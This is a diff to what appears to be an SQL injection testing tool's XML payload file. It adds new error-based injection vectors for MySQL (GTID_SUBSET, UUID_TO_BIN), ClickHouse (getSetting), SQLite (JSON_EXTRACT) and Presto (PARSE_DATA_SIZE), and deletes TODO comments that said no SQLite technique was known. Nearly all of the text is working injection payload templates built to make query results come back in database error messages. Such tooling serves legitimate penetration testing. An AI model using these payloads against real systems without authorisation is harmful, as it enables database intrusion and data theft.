@@ -2,6 +2,88 @@
 
 <root>
     <!-- Error-based tests - WHERE, HAVING, ORDER BY or GROUP BY clause -->
+    <!-- GTID_SUBSET before EXTRACTVALUE: its error reflects ~200 chars vs ~31, so far fewer requests -->
+    <test>
+        <title>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <!-- UUID_TO_BIN backup (MySQL 8.0+, exclusive): ~128-char echo vs EXTRACTVALUE's ~31 if GTID_SUBSET is filtered -->
+    <test>
+        <title>MySQL &gt;= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=UUID_TO_BIN(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>AND [RANDNUM]=UUID_TO_BIN(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 8.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=UUID_TO_BIN(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>OR [RANDNUM]=UUID_TO_BIN(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 8.0</dbms_version>
+        </details>
+    </test>
+
     <test>
         <title>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
         <stype>2</stype>
@@ -48,46 +130,6 @@
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</title>
-        <stype>2</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3,8,9</clause>
-        <where>1</where>
-        <vector>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
-        <request>
-            <payload>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
-        </request>
-        <response>
-            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.6</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)</title>
-        <stype>2</stype>
-        <level>2</level>
-        <risk>3</risk>
-        <clause>1,8,9</clause>
-        <where>1</where>
-        <vector>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
-        <request>
-            <payload>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
-        </request>
-        <response>
-            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.6</dbms_version>
         </details>
     </test>
 
@@ -911,6 +953,26 @@
         </details>
     </test>
 
+    <!-- getSetting backup (ClickHouse-exclusive, unlimited echo, funky/unlikely-filtered) -->
+    <test>
+        <title>ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (getSetting)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=getSetting('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=getSetting('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
     <test>
         <title>H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)</title>
         <stype>2</stype>
@@ -986,10 +1048,86 @@
             <dbms>Spanner</dbms>
         </details>
     </test>
-    <!--
-         TODO: if possible, add payload for SQLite, Microsoft Access,
-         and SAP MaxDB - no known techniques at this time
-    -->
+    <!-- SQLite: an invalid JSON path is the one construct that errors and echoes its argument (needs JSON1) -->
+    <test>
+        <title>SQLite &gt;= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=JSON_EXTRACT('{}','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=JSON_EXTRACT('{}','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt;= 3.9</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt;= 3.9 OR error-based - WHERE or HAVING clause (JSON path)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=JSON_EXTRACT('{}','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=JSON_EXTRACT('{}','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt;= 3.9</dbms_version>
+        </details>
+    </test>
+
+    <!-- Presto/Trino: PARSE_DATA_SIZE is engine-exclusive and echoes its argument ('Invalid data size: X') -->
+    <test>
+        <title>Presto AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PARSE_DATA_SIZE)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=PARSE_DATA_SIZE('[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=PARSE_DATA_SIZE('[DELIMITER_START]'||CAST((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)) AS VARCHAR)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Presto</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Presto OR error-based - WHERE or HAVING clause (PARSE_DATA_SIZE)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=PARSE_DATA_SIZE('[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=PARSE_DATA_SIZE('[DELIMITER_START]'||CAST((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)) AS VARCHAR)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Presto</dbms>
+        </details>
+    </test>
+
     <!-- End of error-based tests - WHERE, HAVING, ORDER BY or GROUP BY clause -->
 
     <!-- Error-based tests - LIMIT clause -->
@@ -1582,10 +1720,6 @@
             <dbms>IBM DB2</dbms>
         </details>
     </test>
-    <!--
-         TODO: if possible, add payload for SQLite, Microsoft Access
-         and SAP MaxDB - no known techniques at this time
-    -->
     <!-- End of error-based tests - ORDER BY, GROUP BY clause -->
 
     <!-- Error-based tests - stacking -->
